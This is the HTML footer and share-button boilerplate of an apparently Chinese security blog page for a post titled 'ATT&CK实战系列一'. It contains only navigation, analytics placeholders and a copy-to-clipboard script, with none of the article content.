  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://140.143.122.13/posts/16266.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://140.143.122.13/posts/16266.html&text=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://140.143.122.13/posts/16266.html&is_video=false&description=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ATT&amp;CK实战系列一&body=Check out this article: http://140.143.122.13/posts/16266.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://140.143.122.13/posts/16266.html&title=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://140.143.122.13/posts/16266.html&name=ATT&amp;CK实战系列一&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://140.143.122.13/posts/16266.html&t=ATT&amp;CK实战系列一" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2020
	<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
	<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">豫ICP备20012507号</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
